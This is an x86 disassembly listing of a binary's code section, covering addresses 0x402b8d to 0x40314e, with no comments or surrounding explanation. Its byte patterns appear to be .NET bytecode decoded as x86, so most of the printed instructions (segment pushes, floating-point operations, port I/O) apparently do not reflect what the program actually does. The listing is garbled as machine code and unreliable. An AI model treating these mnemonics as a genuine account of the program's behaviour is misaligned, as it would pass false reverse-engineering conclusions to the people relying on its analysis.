  402b8d:	2a 00                	sub    (%eax),%al
  402b8f:	00 01                	add    %al,(%ecx)
  402b91:	1c 00                	sbb    $0x0,%al
  402b93:	00 00                	add    %al,(%eax)
  402b95:	00 49 00             	add    %cl,0x0(%ecx)
  402b98:	09 52 00             	or     %edx,0x0(%edx)
  402b9b:	03 13                	add    (%ebx),%edx
  402b9d:	00 00                	add    %al,(%eax)
  402b9f:	01 00                	add    %eax,(%eax)
  402ba1:	00 00                	add    %al,(%eax)
  402ba3:	00 6e 6e             	add    %ch,0x6e(%esi)
  402ba6:	00 03                	add    %al,(%ebx)
  402ba8:	13 00                	adc    (%eax),%eax
  402baa:	00 01                	add    %al,(%ecx)
  402bac:	1b 30                	sbb    (%eax),%esi
  402bae:	02 00                	add    (%eax),%al
  402bb0:	1e                   	push   %ds
  402bb1:	00 00                	add    %al,(%eax)
  402bb3:	00 04 00             	add    %al,(%eax,%eax,1)
  402bb6:	00 11                	add    %dl,(%ecx)
  402bb8:	28 7a 00             	sub    %bh,0x0(%edx)
  402bbb:	00 0a                	add    %cl,(%edx)
  402bbd:	73 7b                	jae    0x402c3a
  402bbf:	00 00                	add    %al,(%eax)
  402bc1:	0a 20                	or     (%eax),%ah
  402bc3:	20 02                	and    %al,(%edx)
  402bc5:	00 00                	add    %al,(%eax)
  402bc7:	6f                   	outsl  %ds:(%esi),(%dx)
  402bc8:	7c 00                	jl     0x402bca
  402bca:	00 0a                	add    %cl,(%edx)
  402bcc:	0a de                	or     %dh,%bl
  402bce:	05 26 16 0a de       	add    $0xde0a1626,%eax
  402bd3:	00 06                	add    %al,(%esi)
  402bd5:	2a 00                	sub    (%eax),%al
  402bd7:	00 01                	add    %al,(%ecx)
  402bd9:	10 00                	adc    %al,(%eax)
  402bdb:	00 00                	add    %al,(%eax)
  402bdd:	00 00                	add    %al,(%eax)
  402bdf:	00 17                	add    %dl,(%edi)
  402be1:	17                   	pop    %ss
  402be2:	00 05 13 00 00 01    	add    %al,0x1000013
  402be8:	f2 19 8d 43 00 00 01 	repnz sbb %ecx,0x1000043(%ebp)
  402bef:	25 16 1f 1a 28       	and    $0x281a1f16,%eax
  402bf4:	33 00                	xor    (%eax),%eax
  402bf6:	00 0a                	add    %cl,(%edx)
  402bf8:	a2 25 17 1f 1c       	mov    %al,0x1c1f1725
  402bfd:	28 33                	sub    %dh,(%ebx)
  402bff:	00 00                	add    %al,(%eax)
  402c01:	0a a2 25 18 28 37    	or     0x37281825(%edx),%ah
  402c07:	00 00                	add    %al,(%eax)
  402c09:	0a a2 80 07 00 00    	or     0x780(%edx),%ah
  402c0f:	04 72                	add    $0x72,%al
  402c11:	00 08                	add    %cl,(%eax)
  402c13:	00 70 80             	add    %dh,-0x80(%eax)
  402c16:	08 00                	or     %al,(%eax)
  402c18:	00 04 73             	add    %al,(%ebx,%esi,2)
  402c1b:	68 00 00 0a 80       	push   $0x800a0000
  402c20:	09 00                	or     %eax,(%eax)
  402c22:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	00 1b                	add    %bl,(%ebx)
  402c29:	30 03                	xor    %al,(%ebx)
  402c2b:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	00 00                	add    %al,(%eax)
  402c33:	00 28                	add    %ch,(%eax)
  402c35:	01 00                	add    %eax,(%eax)
  402c37:	00 06                	add    %al,(%esi)
  402c39:	2c 02                	sub    $0x2,%al
  402c3b:	de 4a 28             	fimuls 0x28(%edx)
  402c3e:	1e                   	push   %ds
  402c3f:	00 00                	add    %al,(%eax)
  402c41:	06                   	push   %es
  402c42:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402c45:	00 06                	add    %al,(%esi)
  402c47:	28 21                	sub    %ah,(%ecx)
  402c49:	00 00                	add    %al,(%eax)
  402c4b:	06                   	push   %es
  402c4c:	28 08                	sub    %cl,(%eax)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	06                   	push   %es
  402c51:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402c54:	00 06                	add    %al,(%esi)
  402c56:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402c59:	00 06                	add    %al,(%esi)
  402c5b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402c5e:	00 06                	add    %al,(%esi)
  402c60:	26 28 1e             	sub    %bl,%es:(%esi)
  402c63:	00 00                	add    %al,(%eax)
  402c65:	06                   	push   %es
  402c66:	28 08                	sub    %cl,(%eax)
  402c68:	00 00                	add    %al,(%eax)
  402c6a:	06                   	push   %es
  402c6b:	7e 0a                	jle    0x402c77
  402c6d:	00 00                	add    %al,(%eax)
  402c6f:	04 17                	add    $0x17,%al
  402c71:	1b 6f 6d             	sbb    0x6d(%edi),%ebp
  402c74:	00 00                	add    %al,(%eax)
  402c76:	0a 1f                	or     (%edi),%bl
  402c78:	3c 5a                	cmp    $0x5a,%al
  402c7a:	1f                   	pop    %ds
  402c7b:	78 5a                	js     0x402cd7
  402c7d:	28 2b                	sub    %ch,(%ebx)
  402c7f:	00 00                	add    %al,(%eax)
  402c81:	0a 2b                	or     (%ebx),%ch
  402c83:	d2 26                	shlb   %cl,(%esi)
  402c85:	de 00                	fiadds (%eax)
  402c87:	2a 01                	sub    (%ecx),%al
  402c89:	10 00                	adc    %al,(%eax)
  402c8b:	00 00                	add    %al,(%eax)
  402c8d:	00 00                	add    %al,(%eax)
  402c8f:	00 50 50             	add    %dl,0x50(%eax)
  402c92:	00 03                	add    %al,(%ebx)
  402c94:	13 00                	adc    (%eax),%eax
  402c96:	00 01                	add    %al,(%ecx)
  402c98:	2e 73 68             	jae,pn 0x402d03
  402c9b:	00 00                	add    %al,(%eax)
  402c9d:	0a 80 0a 00 00 04    	or     0x400000a(%eax),%al
  402ca3:	2a 1b                	sub    (%ebx),%bl
  402ca5:	30 03                	xor    %al,(%ebx)
  402ca7:	00 98 00 00 00 14    	add    %bl,0x14000000(%eax)
  402cad:	00 00                	add    %al,(%eax)
  402caf:	11 28                	adc    %ebp,(%eax)
  402cb1:	2e 00 00             	add    %al,%cs:(%eax)
  402cb4:	0a 6f 2f             	or     0x2f(%edi),%ch
  402cb7:	00 00                	add    %al,(%eax)
  402cb9:	0a 6f 30             	or     0x30(%edi),%ch
  402cbc:	00 00                	add    %al,(%eax)
  402cbe:	0a 0a                	or     (%edx),%cl
  402cc0:	7e 0b                	jle    0x402ccd
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	04 0b                	add    $0xb,%al
  402cc6:	16                   	push   %ss
  402cc7:	0c 2b                	or     $0x2b,%al
  402cc9:	77 07                	ja     0x402cd2
  402ccb:	08 9a 0d 06 09 28    	or     %bl,0x2809060d(%edx)
  402cd1:	1f                   	pop    %ds
  402cd2:	00 00                	add    %al,(%eax)
  402cd4:	06                   	push   %es
  402cd5:	2c 02                	sub    $0x2,%al
  402cd7:	de 6e 09             	fisubrs 0x9(%esi)
  402cda:	28 34 00             	sub    %dh,(%eax,%eax,1)
  402cdd:	00 0a                	add    %cl,(%edx)
  402cdf:	2c 2b                	sub    $0x2b,%al
  402ce1:	06                   	push   %es
  402ce2:	73 7d                	jae    0x402d61
  402ce4:	00 00                	add    %al,(%eax)
  402ce6:	0a 09                	or     (%ecx),%cl
  402ce8:	73 7d                	jae    0x402d67
  402cea:	00 00                	add    %al,(%eax)
  402cec:	0a 13                	or     (%ebx),%dl
  402cee:	04 6f                	add    $0x6f,%al
  402cf0:	7e 00                	jle    0x402cf2
  402cf2:	00 0a                	add    %cl,(%edx)
  402cf4:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402cf7:	7e 00                	jle    0x402cf9
  402cf9:	00 0a                	add    %cl,(%edx)
  402cfb:	33 0f                	xor    (%edi),%ecx
  402cfd:	09 28                	or     %ebp,(%eax)
  402cff:	7f 00                	jg     0x402d01
  402d01:	00 0a                	add    %cl,(%edx)
  402d03:	26 16                	es push %ss
  402d05:	28 80 00 00 0a de    	sub    %al,-0x21f60000(%eax)
  402d0b:	3b 06                	cmp    (%esi),%eax
  402d0d:	09 17                	or     %edx,(%edi)
  402d0f:	28 81 00 00 0a 09    	sub    %al,0x90a0000(%ecx)
  402d15:	1c 28                	sbb    $0x28,%al
  402d17:	73 00                	jae    0x402d19
  402d19:	00 0a                	add    %cl,(%edx)
  402d1b:	09 28                	or     %ebp,(%eax)
  402d1d:	7f 00                	jg     0x402d1f
  402d1f:	00 0a                	add    %cl,(%edx)
  402d21:	26 16                	es push %ss
  402d23:	28 80 00 00 0a de    	sub    %al,-0x21f60000(%eax)
  402d29:	13 26                	adc    (%esi),%esp
  402d2b:	20 2c 01             	and    %ch,(%ecx,%eax,1)
  402d2e:	00 00                	add    %al,(%eax)
  402d30:	28 2b                	sub    %ch,(%ebx)
  402d32:	00 00                	add    %al,(%eax)
  402d34:	0a de                	or     %dh,%bl
  402d36:	06                   	push   %es
  402d37:	26 de 03             	fiadds %es:(%ebx)
  402d3a:	26 de 00             	fiadds %es:(%eax)
  402d3d:	08 17                	or     %dl,(%edi)
  402d3f:	58                   	pop    %eax
  402d40:	0c 08                	or     $0x8,%al
  402d42:	07                   	pop    %es
  402d43:	8e 69 32             	mov    0x32(%ecx),%gs
  402d46:	83 2a 01             	subl   $0x1,(%edx)
  402d49:	28 00                	sub    %al,(%eax)
  402d4b:	00 00                	add    %al,(%eax)
  402d4d:	00 1e                	add    %bl,(%esi)
  402d4f:	00 5c 7a 00          	add    %bl,0x0(%edx,%edi,2)
  402d53:	0d 34 00 00 01       	or     $0x1000034,%eax
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	1e                   	push   %ds
  402d5b:	00 5c 87 00          	add    %bl,0x0(%edi,%eax,4)
  402d5f:	03 33                	add    (%ebx),%esi
  402d61:	00 00                	add    %al,(%eax)
  402d63:	01 00                	add    %eax,(%eax)
  402d65:	00 1e                	add    %bl,(%esi)
  402d67:	00 5c 8a 00          	add    %bl,0x0(%edx,%ecx,4)
  402d6b:	03 13                	add    (%ebx),%edx
  402d6d:	00 00                	add    %al,(%eax)
  402d6f:	01 ce                	add    %ecx,%esi
  402d71:	02 28                	add    (%eax),%ch
  402d73:	82 00 00             	addb   $0x0,(%eax)
  402d76:	0a 17                	or     (%edi),%dl
  402d78:	8d 5b 00             	lea    0x0(%ebx),%ebx
  402d7b:	00 01                	add    %al,(%ecx)
  402d7d:	25 16 1f 5c 9d       	and    $0x9d5c1f16,%eax
  402d82:	6f                   	outsl  %ds:(%esi),(%dx)
  402d83:	83 00 00             	addl   $0x0,(%eax)
  402d86:	0a 03                	or     (%ebx),%al
  402d88:	28 82 00 00 0a 17    	sub    %al,0x170a0000(%edx)
  402d8e:	8d 5b 00             	lea    0x0(%ebx),%ebx
  402d91:	00 01                	add    %al,(%ecx)
  402d93:	25 16 1f 5c 9d       	and    $0x9d5c1f16,%eax
  402d98:	6f                   	outsl  %ds:(%esi),(%dx)
  402d99:	83 00 00             	addl   $0x0,(%eax)
  402d9c:	0a 1b                	or     (%ebx),%bl
  402d9e:	28 84 00 00 0a 2a 13 	sub    %al,0x132a0a00(%eax,%eax,1)
  402da5:	30 05 00 46 00 00    	xor    %al,0x4600
  402dab:	00 00                	add    %al,(%eax)
  402dad:	00 00                	add    %al,(%eax)
  402daf:	00 19                	add    %bl,(%ecx)
  402db1:	8d 43 00             	lea    0x0(%ebx),%eax
  402db4:	00 01                	add    %al,(%ecx)
  402db6:	25 16 1f 1a 28       	and    $0x281a1f16,%eax
  402dbb:	33 00                	xor    (%eax),%eax
  402dbd:	00 0a                	add    %cl,(%edx)
  402dbf:	72 1a                	jb     0x402ddb
  402dc1:	08 00                	or     %al,(%eax)
  402dc3:	70 28                	jo     0x402ded
  402dc5:	31 00                	xor    %eax,(%eax)
  402dc7:	00 0a                	add    %cl,(%edx)
  402dc9:	a2 25 17 28 37       	mov    %al,0x37281725
  402dce:	00 00                	add    %al,(%eax)
  402dd0:	0a 72 1a             	or     0x1a(%edx),%dh
  402dd3:	08 00                	or     %al,(%eax)
  402dd5:	70 28                	jo     0x402dff
  402dd7:	31 00                	xor    %eax,(%eax)
  402dd9:	00 0a                	add    %cl,(%edx)
  402ddb:	a2 25 18 1f 1c       	mov    %al,0x1c1f1825
  402de0:	28 33                	sub    %dh,(%ebx)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	0a 72 1a             	or     0x1a(%edx),%dh
  402de7:	08 00                	or     %al,(%eax)
  402de9:	70 28                	jo     0x402e13
  402deb:	31 00                	xor    %eax,(%eax)
  402ded:	00 0a                	add    %cl,(%edx)
  402def:	a2 80 0b 00 00       	mov    %al,0xb80
  402df4:	04 2a                	add    $0x2a,%al
  402df6:	00 00                	add    %al,(%eax)
  402df8:	13 30                	adc    (%eax),%esi
  402dfa:	02 00                	add    (%eax),%al
  402dfc:	48                   	dec    %eax
  402dfd:	00 00                	add    %al,(%eax)
  402dff:	00 00                	add    %al,(%eax)
  402e01:	00 00                	add    %al,(%eax)
  402e03:	00 7e 0d             	add    %bh,0xd(%esi)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	04 2c                	add    $0x2c,%al
  402e0a:	01 2a                	add    %ebp,(%edx)
  402e0c:	17                   	pop    %ss
  402e0d:	80 0d 00 00 04 73 85 	orb    $0x85,0x73040000
  402e14:	00 00                	add    %al,(%eax)
  402e16:	0a 80 0e 00 00 04    	or     0x400000e(%eax),%al
  402e1c:	7e 34                	jle    0x402e52
  402e1e:	00 00                	add    %al,(%eax)
  402e20:	04 25                	add    $0x25,%al
  402e22:	2d 17 26 7e 33       	sub    $0x337e2617,%eax
  402e27:	00 00                	add    %al,(%eax)
  402e29:	04 fe                	add    $0xfe,%al
  402e2b:	06                   	push   %es
  402e2c:	43                   	inc    %ebx
  402e2d:	00 00                	add    %al,(%eax)
  402e2f:	06                   	push   %es
  402e30:	73 86                	jae    0x402db8
  402e32:	00 00                	add    %al,(%eax)
  402e34:	0a 25 80 34 00 00    	or     0x3480,%ah
  402e3a:	04 7e                	add    $0x7e,%al
  402e3c:	0e                   	push   %cs
  402e3d:	00 00                	add    %al,(%eax)
  402e3f:	04 6f                	add    $0x6f,%al
  402e41:	87 00                	xchg   %eax,(%eax)
  402e43:	00 0a                	add    %cl,(%edx)
  402e45:	28 88 00 00 0a 26    	sub    %cl,0x260a0000(%eax)
  402e4b:	2a 8e 7e 0d 00 00    	sub    0xd7e(%esi),%cl
  402e51:	04 2d                	add    $0x2d,%al
  402e53:	01 2a                	add    %ebp,(%edx)
  402e55:	7e 0e                	jle    0x402e65
  402e57:	00 00                	add    %al,(%eax)
  402e59:	04 6f                	add    $0x6f,%al
  402e5b:	89 00                	mov    %eax,(%eax)
  402e5d:	00 0a                	add    %cl,(%edx)
  402e5f:	16                   	push   %ss
  402e60:	80 0d 00 00 04 72 30 	orb    $0x30,0x72040000
  402e67:	08 00                	or     %al,(%eax)
  402e69:	70 28                	jo     0x402e93
  402e6b:	24 00                	and    $0x0,%al
  402e6d:	00 06                	add    %al,(%esi)
  402e6f:	2a 13                	sub    (%ebx),%dl
  402e71:	30 02                	xor    %al,(%edx)
  402e73:	00 2f                	add    %ch,(%edi)
  402e75:	00 00                	add    %al,(%eax)
  402e77:	00 15 00 00 11 12    	add    %dl,0x12110000
  402e7d:	00 28                	add    %ch,(%eax)
  402e7f:	3e 00 00             	add    %al,%ds:(%eax)
  402e82:	0a 7d 36             	or     0x36(%ebp),%bh
  402e85:	00 00                	add    %al,(%eax)
  402e87:	04 12                	add    $0x12,%al
  402e89:	00 15 7d 35 00 00    	add    %dl,0x357d
  402e8f:	04 12                	add    $0x12,%al
  402e91:	00 7c 36 00          	add    %bh,0x0(%esi,%esi,1)
  402e95:	00 04 12             	add    %al,(%edx,%edx,1)
  402e98:	00 28                	add    %ch,(%eax)
  402e9a:	05 00 00 2b 12       	add    $0x122b0000,%eax
  402e9f:	00 7c 36 00          	add    %bh,0x0(%esi,%esi,1)
  402ea3:	00 04 28             	add    %al,(%eax,%ebp,1)
  402ea6:	40                   	inc    %eax
  402ea7:	00 00                	add    %al,(%eax)
  402ea9:	0a 2a                	or     (%edx),%ch
  402eab:	00 1b                	add    %bl,(%ebx)
  402ead:	30 01                	xor    %al,(%ecx)
  402eaf:	00 17                	add    %dl,(%edi)
  402eb1:	00 00                	add    %al,(%eax)
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	00 00                	add    %al,(%eax)
  402eb7:	00 1b                	add    %bl,(%ebx)
  402eb9:	28 8a 00 00 0a 02    	sub    %cl,0x20a0000(%edx)
  402ebf:	28 45 00             	sub    %al,0x0(%ebp)
  402ec2:	00 0a                	add    %cl,(%edx)
  402ec4:	28 8b 00 00 0a de    	sub    %cl,-0x21f60000(%ebx)
  402eca:	03 26                	add    (%esi),%esp
  402ecc:	de 00                	fiadds (%eax)
  402ece:	2a 00                	sub    (%eax),%al
  402ed0:	01 10                	add    %edx,(%eax)
  402ed2:	00 00                	add    %al,(%eax)
  402ed4:	00 00                	add    %al,(%eax)
  402ed6:	00 00                	add    %al,(%eax)
  402ed8:	13 13                	adc    (%ebx),%edx
  402eda:	00 03                	add    %al,(%ebx)
  402edc:	13 00                	adc    (%eax),%eax
  402ede:	00 01                	add    %al,(%ecx)
  402ee0:	46                   	inc    %esi
  402ee1:	73 68                	jae    0x402f4b
  402ee3:	00 00                	add    %al,(%eax)
  402ee5:	0a 80 0c 00 00 04    	or     0x400000c(%eax),%al
  402eeb:	16                   	push   %ss
  402eec:	80 0d 00 00 04 2a 00 	orb    $0x0,0x2a040000
  402ef3:	00 13                	add    %dl,(%ebx)
  402ef5:	30 02                	xor    %al,(%edx)
  402ef7:	00 42 00             	add    %al,0x0(%edx)
  402efa:	00 00                	add    %al,(%eax)
  402efc:	00 00                	add    %al,(%eax)
  402efe:	00 00                	add    %al,(%eax)
  402f00:	7e 12                	jle    0x402f14
  402f02:	00 00                	add    %al,(%eax)
  402f04:	04 2c                	add    $0x2c,%al
  402f06:	01 2a                	add    %ebp,(%edx)
  402f08:	73 85                	jae    0x402e8f
  402f0a:	00 00                	add    %al,(%eax)
  402f0c:	0a 80 12 00 00 04    	or     0x4000012(%eax),%al
  402f12:	7e 3b                	jle    0x402f4f
  402f14:	00 00                	add    %al,(%eax)
  402f16:	04 25                	add    $0x25,%al
  402f18:	2d 17 26 7e 3a       	sub    $0x3a7e2617,%eax
  402f1d:	00 00                	add    %al,(%eax)
  402f1f:	04 fe                	add    $0xfe,%al
  402f21:	06                   	push   %es
  402f22:	48                   	dec    %eax
  402f23:	00 00                	add    %al,(%eax)
  402f25:	06                   	push   %es
  402f26:	73 86                	jae    0x402eae
  402f28:	00 00                	add    %al,(%eax)
  402f2a:	0a 25 80 3b 00 00    	or     0x3b80,%ah
  402f30:	04 7e                	add    $0x7e,%al
  402f32:	12 00                	adc    (%eax),%al
  402f34:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402f37:	87 00                	xchg   %eax,(%eax)
  402f39:	00 0a                	add    %cl,(%edx)
  402f3b:	28 88 00 00 0a 26    	sub    %cl,0x260a0000(%eax)
  402f41:	2a 8e 7e 12 00 00    	sub    0x127e(%esi),%cl
  402f47:	04 2d                	add    $0x2d,%al
  402f49:	01 2a                	add    %ebp,(%edx)
  402f4b:	7e 12                	jle    0x402f5f
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	04 6f                	add    $0x6f,%al
  402f51:	89 00                	mov    %eax,(%eax)
  402f53:	00 0a                	add    %cl,(%edx)
  402f55:	14 80                	adc    $0x80,%al
  402f57:	12 00                	adc    (%eax),%al
  402f59:	00 04 72             	add    %al,(%edx,%esi,2)
  402f5c:	4a                   	dec    %edx
  402f5d:	08 00                	or     %al,(%eax)
  402f5f:	70 28                	jo     0x402f89
  402f61:	2a 00                	sub    (%eax),%al
  402f63:	00 06                	add    %al,(%esi)
  402f65:	2a 00                	sub    (%eax),%al
  402f67:	00 13                	add    %dl,(%ebx)
  402f69:	30 02                	xor    %al,(%edx)
  402f6b:	00 2f                	add    %ch,(%edi)
  402f6d:	00 00                	add    %al,(%eax)
  402f6f:	00 16                	add    %dl,(%esi)
  402f71:	00 00                	add    %al,(%eax)
  402f73:	11 12                	adc    %edx,(%edx)
  402f75:	00 28                	add    %ch,(%eax)
  402f77:	3e 00 00             	add    %al,%ds:(%eax)
  402f7a:	0a 7d 3e             	or     0x3e(%ebp),%bh
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	04 12                	add    $0x12,%al
  402f81:	00 15 7d 3d 00 00    	add    %dl,0x3d7d
  402f87:	04 12                	add    $0x12,%al
  402f89:	00 7c 3e 00          	add    %bh,0x0(%esi,%edi,1)
  402f8d:	00 04 12             	add    %al,(%edx,%edx,1)
  402f90:	00 28                	add    %ch,(%eax)
  402f92:	06                   	push   %es
  402f93:	00 00                	add    %al,(%eax)
  402f95:	2b 12                	sub    (%edx),%edx
  402f97:	00 7c 3e 00          	add    %bh,0x0(%esi,%edi,1)
  402f9b:	00 04 28             	add    %al,(%eax,%ebp,1)
  402f9e:	40                   	inc    %eax
  402f9f:	00 00                	add    %al,(%eax)
  402fa1:	0a 2a                	or     (%edx),%ch
  402fa3:	00 1b                	add    %bl,(%ebx)
  402fa5:	30 05 00 57 00 00    	xor    %al,0x5700
  402fab:	00 17                	add    %dl,(%edi)
  402fad:	00 00                	add    %al,(%eax)
  402faf:	11 02                	adc    %eax,(%edx)
  402fb1:	8d 5b 00             	lea    0x0(%ebx),%ebx
  402fb4:	00 01                	add    %al,(%ecx)
  402fb6:	0a 7e 10             	or     0x10(%esi),%bh
  402fb9:	00 00                	add    %al,(%eax)
  402fbb:	04 0b                	add    $0xb,%al
  402fbd:	16                   	push   %ss
  402fbe:	0c 07                	or     $0x7,%al
  402fc0:	12 02                	adc    (%edx),%al
  402fc2:	28 8c 00 00 0a 16 0d 	sub    %cl,0xd160a00(%eax,%eax,1)
  402fc9:	2b 25 06 09 72 74    	sub    0x74720906,%esp
  402fcf:	08 00                	or     %al,(%eax)
  402fd1:	70 7e                	jo     0x403051
  402fd3:	10 00                	adc    %al,(%eax)
  402fd5:	00 04 72             	add    %al,(%edx,%esi,2)
  402fd8:	74 08                	je     0x402fe2
  402fda:	00 70 28             	add    %dh,0x28(%eax)
  402fdd:	6e                   	outsb  %ds:(%esi),(%dx)
  402fde:	00 00                	add    %al,(%eax)
  402fe0:	0a 6f 6f             	or     0x6f(%edi),%ch
  402fe3:	00 00                	add    %al,(%eax)
  402fe5:	0a 28                	or     (%eax),%ch
  402fe7:	70 00                	jo     0x402fe9
  402fe9:	00 0a                	add    %cl,(%edx)
  402feb:	9d                   	popf
  402fec:	09 17                	or     %edx,(%edi)
  402fee:	58                   	pop    %eax
  402fef:	0d 09 02 32 d7       	or     $0xd7320209,%eax
  402ff4:	de 0a                	fimuls (%edx)
  402ff6:	08 2c 06             	or     %ch,(%esi,%eax,1)
  402ff9:	07                   	pop    %es
  402ffa:	28 8d 00 00 0a dc    	sub    %cl,-0x23f60000(%ebp)
  403000:	06                   	push   %es
  403001:	73 71                	jae    0x403074
  403003:	00 00                	add    %al,(%eax)
  403005:	0a 2a                	or     (%edx),%ch
  403007:	00 01                	add    %al,(%ecx)
  403009:	10 00                	adc    %al,(%eax)
  40300b:	00 02                	add    %al,(%edx)
  40300d:	00 0f                	add    %cl,(%edi)
  40300f:	00 37                	add    %dh,(%edi)
  403011:	46                   	inc    %esi
  403012:	00 0a                	add    %cl,(%edx)
  403014:	00 00                	add    %al,(%eax)
  403016:	00 00                	add    %al,(%eax)
  403018:	1b 30                	sbb    (%eax),%esi
  40301a:	01 00                	add    %eax,(%eax)
  40301c:	17                   	pop    %ss
  40301d:	00 00                	add    %al,(%eax)
  40301f:	00 00                	add    %al,(%eax)
  403021:	00 00                	add    %al,(%eax)
  403023:	00 18                	add    %bl,(%eax)
  403025:	28 8a 00 00 0a 02    	sub    %cl,0x20a0000(%edx)
  40302b:	28 45 00             	sub    %al,0x0(%ebp)
  40302e:	00 0a                	add    %cl,(%edx)
  403030:	28 8b 00 00 0a de    	sub    %cl,-0x21f60000(%ebx)
  403036:	03 26                	add    (%esi),%esp
  403038:	de 00                	fiadds (%eax)
  40303a:	2a 00                	sub    (%eax),%al
  40303c:	01 10                	add    %edx,(%eax)
  40303e:	00 00                	add    %al,(%eax)
  403040:	00 00                	add    %al,(%eax)
  403042:	00 00                	add    %al,(%eax)
  403044:	13 13                	adc    (%ebx),%edx
  403046:	00 03                	add    %al,(%ebx)
  403048:	13 00                	adc    (%eax),%eax
  40304a:	00 01                	add    %al,(%ecx)
  40304c:	13 30                	adc    (%eax),%esi
  40304e:	05 00 50 00 00       	add    $0x5000,%eax
  403053:	00 00                	add    %al,(%eax)
  403055:	00 00                	add    %al,(%eax)
  403057:	00 28                	add    %ch,(%eax)
  403059:	2e 00 00             	add    %al,%cs:(%eax)
  40305c:	0a 6f 2f             	or     0x2f(%edi),%ch
  40305f:	00 00                	add    %al,(%eax)
  403061:	0a 6f 30             	or     0x30(%edi),%ch
  403064:	00 00                	add    %al,(%eax)
  403066:	0a 80 0f 00 00 04    	or     0x400000f(%eax),%al
  40306c:	73 68                	jae    0x4030d6
  40306e:	00 00                	add    %al,(%eax)
  403070:	0a 80 10 00 00 04    	or     0x4000010(%eax),%al
  403076:	19 8d 43 00 00 01    	sbb    %ecx,0x1000043(%ebp)
  40307c:	25 16 16 28 33       	and    $0x33281616,%eax
  403081:	00 00                	add    %al,(%eax)
  403083:	0a a2 25 17 1f 28    	or     0x281f1725(%edx),%ah
  403089:	28 33                	sub    %dh,(%ebx)
  40308b:	00 00                	add    %al,(%eax)
  40308d:	0a 72 64             	or     0x64(%edx),%dh
  403090:	06                   	push   %es
  403091:	00 70 28             	add    %dh,0x28(%eax)
  403094:	31 00                	xor    %eax,(%eax)
  403096:	00 0a                	add    %cl,(%edx)
  403098:	a2 25 18 1b 28       	mov    %al,0x281b1825
  40309d:	33 00                	xor    (%eax),%eax
  40309f:	00 0a                	add    %cl,(%edx)
  4030a1:	a2 80 11 00 00       	mov    %al,0x1180
  4030a6:	04 2a                	add    $0x2a,%al
  4030a8:	1b 30                	sbb    (%eax),%esi
  4030aa:	03 00                	add    (%eax),%eax
  4030ac:	b2 00                	mov    $0x0,%dl
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	18 00                	sbb    %al,(%eax)
  4030b2:	00 11                	add    %dl,(%ecx)
  4030b4:	28 2e                	sub    %ch,(%esi)
  4030b6:	00 00                	add    %al,(%eax)
  4030b8:	0a 6f 2f             	or     0x2f(%edi),%ch
  4030bb:	00 00                	add    %al,(%eax)
  4030bd:	0a 6f 30             	or     0x30(%edi),%ch
  4030c0:	00 00                	add    %al,(%eax)
  4030c2:	0a 0a                	or     (%edx),%cl
  4030c4:	28 8e 00 00 0a 0b    	sub    %cl,0xb0a0000(%esi)
  4030ca:	16                   	push   %ss
  4030cb:	0c 38                	or     $0x38,%al
  4030cd:	8b 00                	mov    (%eax),%eax
  4030cf:	00 00                	add    %al,(%eax)
  4030d1:	07                   	pop    %es
  4030d2:	08 9a 0d 09 6f 8f    	or     %bl,-0x7090f6f3(%edx)
  4030d8:	00 00                	add    %al,(%eax)
  4030da:	0a 2c 5f             	or     (%edi,%ebx,2),%ch
  4030dd:	09 6f 90             	or     %ebp,-0x70(%edi)
  4030e0:	00 00                	add    %al,(%eax)
  4030e2:	0a 18                	or     (%eax),%bl
  4030e4:	33 56 09             	xor    0x9(%esi),%edx
  4030e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4030e8:	91                   	xchg   %eax,%ecx
  4030e9:	00 00                	add    %al,(%eax)
  4030eb:	0a 6f 92             	or     -0x6e(%edi),%ch
  4030ee:	00 00                	add    %al,(%eax)
  4030f0:	0a 13                	or     (%ebx),%dl
  4030f2:	04 11                	add    $0x11,%al
  4030f4:	04 72                	add    $0x72,%al
  4030f6:	f2 08 00             	repnz or %al,(%eax)
  4030f9:	70 28                	jo     0x403123
  4030fb:	31 00                	xor    %eax,(%eax)
  4030fd:	00 0a                	add    %cl,(%edx)
  4030ff:	13 05 11 05 28 34    	adc    0x34280511,%eax
  403105:	00 00                	add    %al,(%eax)
  403107:	0a 2d 10 06 11 05    	or     0x5110610,%ch
  40310d:	28 72 00             	sub    %dh,0x0(%edx)
  403110:	00 0a                	add    %cl,(%edx)
  403112:	11 05 1c 28 73 00    	adc    %eax,0x73281c
  403118:	00 0a                	add    %cl,(%edx)
  40311a:	11 04 72             	adc    %eax,(%edx,%esi,2)
  40311d:	0e                   	push   %cs
  40311e:	09 00                	or     %eax,(%eax)
  403120:	70 28                	jo     0x40314a
  403122:	31 00                	xor    %eax,(%eax)
  403124:	00 0a                	add    %cl,(%edx)
  403126:	13 06                	adc    (%esi),%eax
  403128:	11 06                	adc    %eax,(%esi)
  40312a:	28 34 00             	sub    %dh,(%eax,%eax,1)
  40312d:	00 0a                	add    %cl,(%edx)
  40312f:	2d 0b 11 06 11       	sub    $0x1106110b,%eax
  403134:	05 11 04 28 2d       	add    $0x2d280411,%eax
  403139:	00 00                	add    %al,(%eax)
  40313b:	06                   	push   %es
  40313c:	de 1a                	ficomps (%edx)
  40313e:	13 07                	adc    (%edi),%eax
  403140:	72 26                	jb     0x403168
  403142:	09 00                	or     %eax,(%eax)
  403144:	70 11                	jo     0x403157
  403146:	07                   	pop    %es
  403147:	6f                   	outsl  %ds:(%esi),(%dx)
  403148:	50                   	push   %eax
  403149:	00 00                	add    %al,(%eax)
  40314b:	0a 28                	or     (%eax),%ch
  40314d:	4d                   	dec    %ebp
  40314e:	00 00                	add    %al,(%eax)
